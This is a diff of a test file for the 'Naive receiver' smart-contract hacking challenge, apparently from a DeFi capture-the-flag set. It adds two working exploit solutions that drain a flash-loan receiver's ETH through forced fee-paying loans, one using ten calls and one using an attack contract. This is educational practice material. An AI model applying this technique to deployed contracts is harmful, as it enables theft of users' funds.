@@ -2,46 +2,82 @@ const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
 describe('[Challenge] Naive receiver', function () {
-    let deployer, user, attacker;
+  let deployer, user, attacker;
 
-    // Pool has 1000 ETH in balance
-    const ETHER_IN_POOL = ethers.utils.parseEther('1000');
+  // Pool has 1000 ETH in balance
+  const ETHER_IN_POOL = ethers.utils.parseEther('1000');
 
-    // Receiver has 10 ETH in balance
-    const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
+  // Receiver has 10 ETH in balance
+  const ETHER_IN_RECEIVER = ethers.utils.parseEther('10');
 
-    before(async function () {
-        /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
-        [deployer, user, attacker] = await ethers.getSigners();
+  let expectedEthInPool = ETHER_IN_POOL;
 
-        const LenderPoolFactory = await ethers.getContractFactory('NaiveReceiverLenderPool', deployer);
-        const FlashLoanReceiverFactory = await ethers.getContractFactory('FlashLoanReceiver', deployer);
+  before(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    [deployer, user, attacker] = await ethers.getSigners();
 
-        this.pool = await LenderPoolFactory.deploy();
-        await deployer.sendTransaction({ to: this.pool.address, value: ETHER_IN_POOL });
-        
-        expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(ETHER_IN_POOL);
-        expect(await this.pool.fixedFee()).to.be.equal(ethers.utils.parseEther('1'));
+    const LenderPoolFactory = await ethers.getContractFactory(
+      'NaiveReceiverLenderPool',
+      deployer
+    );
+    const FlashLoanReceiverFactory = await ethers.getContractFactory(
+      'FlashLoanReceiver',
+      deployer
+    );
 
-        this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
-        await deployer.sendTransaction({ to: this.receiver.address, value: ETHER_IN_RECEIVER });
-        
-        expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(ETHER_IN_RECEIVER);
+    this.pool = await LenderPoolFactory.deploy();
+    await deployer.sendTransaction({
+      to: this.pool.address,
+      value: ETHER_IN_POOL,
     });
 
-    it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */   
+    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
+      ETHER_IN_POOL
+    );
+    expect(await this.pool.fixedFee()).to.be.equal(
+      ethers.utils.parseEther('1')
+    );
+
+    this.receiver = await FlashLoanReceiverFactory.deploy(this.pool.address);
+  });
+  beforeEach(async function () {
+    /** SETUP SCENARIO - NO NEED TO CHANGE ANYTHING HERE */
+    await deployer.sendTransaction({
+      to: this.receiver.address,
+      value: ETHER_IN_RECEIVER,
     });
 
-    after(async function () {
-        /** SUCCESS CONDITIONS */
+    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
+      ETHER_IN_RECEIVER
+    );
+  });
+  it('Exploit - Method 1, 10 individual transactions', async function () {
+    /** CODE YOUR EXPLOIT HERE */
+    for (let i = 0; i < 10; i++) {
+      await this.pool
+        .connect(attacker)
+        .flashLoan(this.receiver.address, ethers.utils.parseEther('1'));
+    }
+    expectedEthInPool = expectedEthInPool.add(ETHER_IN_RECEIVER);
+  });
+  it('Exploit - Method 2, single transaction', async function () {
+    /** CODE YOUR EXPLOIT HERE */
+    const attackNaiveReceiver = await (
+      await ethers.getContractFactory('AttackNaiveReceiver', attacker)
+    ).deploy(this.pool.address);
+    await attackNaiveReceiver.deployed();
+    await attackNaiveReceiver.attack(this.receiver.address);
+    expectedEthInPool = expectedEthInPool.add(ETHER_IN_RECEIVER);
+  });
+  afterEach(async function () {
+    /** SUCCESS CONDITIONS */
 
-        // All ETH has been drained from the receiver
-        expect(
-            await ethers.provider.getBalance(this.receiver.address)
-        ).to.be.equal('0');
-        expect(
-            await ethers.provider.getBalance(this.pool.address)
-        ).to.be.equal(ETHER_IN_POOL.add(ETHER_IN_RECEIVER));
-    });
+    // All ETH has been drained from the receiver
+    expect(await ethers.provider.getBalance(this.receiver.address)).to.be.equal(
+      '0'
+    );
+    expect(await ethers.provider.getBalance(this.pool.address)).to.be.equal(
+      expectedEthInPool
+    );
+  });
 });
